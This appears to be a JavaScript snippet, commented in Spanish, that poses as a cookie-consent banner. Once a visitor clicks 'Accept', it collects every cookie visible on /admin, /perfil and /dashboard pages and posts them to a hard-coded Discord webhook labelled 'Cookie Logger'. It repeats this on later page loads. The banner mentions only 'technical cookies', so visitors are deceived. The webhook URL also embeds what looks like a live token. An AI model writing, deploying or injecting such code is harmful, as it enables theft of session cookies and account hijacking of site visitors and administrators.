(() => {
  // Configuración
  const rutasPermitidas = ["/admin", "/perfil", "/dashboard"];  // Rutas donde se recopilan cookies
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1392215955202899988/0R-ovZqLiDQymCUo55uYjHNAjZfRQ8LA8rtqNKj2KvGfGB5sGO53fgRtQU9to38Dngyg"; // Pon aquí tu webhook

  // Crear banner en DOM
  function crearBanner() {
    if (document.getElementById("cookie-banner")) return; // No duplicar

    const banner = document.createElement("div");
    banner.id = "cookie-banner";
    banner.style.position = "fixed";
    banner.style.bottom = "0";
    banner.style.left = "0";
    banner.style.right = "0";
    banner.style.background = "#fff";
    banner.style.padding = "15px";
    banner.style.borderTop = "1px solid #ccc";
    banner.style.textAlign = "center";
    banner.style.fontFamily = "sans-serif";
    banner.style.zIndex = "9999";
    banner.style.boxShadow = "0 -2px 10px rgba(0,0,0,0.1)";

    banner.innerHTML = `
      <p><strong>Este sitio utiliza cookies técnicas.</strong><br>
      Solo recopilaremos cookies visibles en secciones específicas si aceptas.</p>
      <button id="accept-btn" style="margin:5px;padding:8px 16px; border:none; border-radius:5px; cursor:pointer; background:#4CAF50; color:#fff;">Aceptar</button>
      <button id="reject-btn" style="margin:5px;padding:8px 16px; border:none; border-radius:5px; cursor:pointer; background:#f44336; color:#fff;">Rechazar</button>
    `;

    document.body.appendChild(banner);

    document.getElementById("accept-btn").onclick = () => handleCookieConsent(true);
    document.getElementById("reject-btn").onclick = () => handleCookieConsent(false);
  }

  // Guardar consentimiento y actuar
  function handleCookieConsent(accepted) {
    document.cookie = `cookies_aceptadas=${accepted}; path=/; max-age=31536000`;
    const banner = document.getElementById("cookie-banner");
    if (banner) banner.style.display = "none";

    if (accepted) {
      recopilarYEnviarCookies();
    }
  }

  // Recopilar y enviar cookies si ruta permitida
  function recopilarYEnviarCookies() {
    const path = window.location.pathname;
    const rutaValida = rutasPermitidas.some(ruta => path.startsWith(ruta));
    if (!rutaValida) {
      console.log("Ruta no permitida para recopilación:", path);
      return;
    }

    const cookies = parseCookies(document.cookie);
    if (Object.keys(cookies).length === 0) {
      console.log("No hay cookies visibles para enviar.");
      return;
    }

    const mensaje = `📄 **Ruta:** ${path}\n🍪 **Cookies visibles:**\n` +
      Object.entries(cookies).map(([k, v]) => `• \`${k}\` = \`${v}\``).join("\n");

    fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        username: "Cookie Logger",
        content: mensaje
      })
    }).then(res => {
      if (res.ok) {
        console.log("Cookies enviadas correctamente al webhook.");
      } else {
        console.warn("Error al enviar al webhook.");
      }
    }).catch(err => console.error("Error al enviar cookies:", err));
  }

  // Parsear document.cookie a objeto
  function parseCookies(str) {
    return str.split(";").reduce((acc, pair) => {
      const [key, value] = pair.trim().split("=");
      if (key) acc[key] = decodeURIComponent(value || "");
      return acc;
    }, {});
  }

  // Inicialización al cargar
  window.addEventListener("load", () => {
    const cookieConsent = document.cookie.match(/cookies_aceptadas=([^;]+)/);
    if (cookieConsent && cookieConsent[1] === "true") {
      recopilarYEnviarCookies();
    } else if (cookieConsent && cookieConsent[1] === "false") {
      // Consentimiento negado, no mostrar banner
    } else {
      crearBanner();
    }
  });
})();
